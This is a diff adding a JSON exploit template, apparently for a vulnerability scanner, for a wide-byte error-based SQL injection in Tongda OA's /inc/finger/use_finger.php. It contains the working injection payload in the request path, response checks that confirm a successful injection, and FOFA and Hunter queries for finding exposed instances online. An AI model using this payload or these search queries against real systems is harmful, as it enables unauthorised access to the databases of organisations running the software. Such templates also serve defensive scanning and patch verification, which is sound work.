@@ -1,0 +1,36 @@
+{
+  "product": "通达OA",
+  "vul_name": "通达OA SQL注入_宽字节报错(/inc/finger/use_finger.php)",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "通达OA SQL注入_宽字节报错(/inc/finger/use_finger.php)",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"TDXK-通达OA\"",
+    "Hunter": "app.name=\"通达 OA\""
+  },
+  "protocol": "http",
+  "link": "",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/inc/finger/use_finger.php?USER_ID=1%df'and extractvalue(1,concat(0x5c,MD5(123456))) -- -"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "body": "XPATH syntax error"
+        },
+        {
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
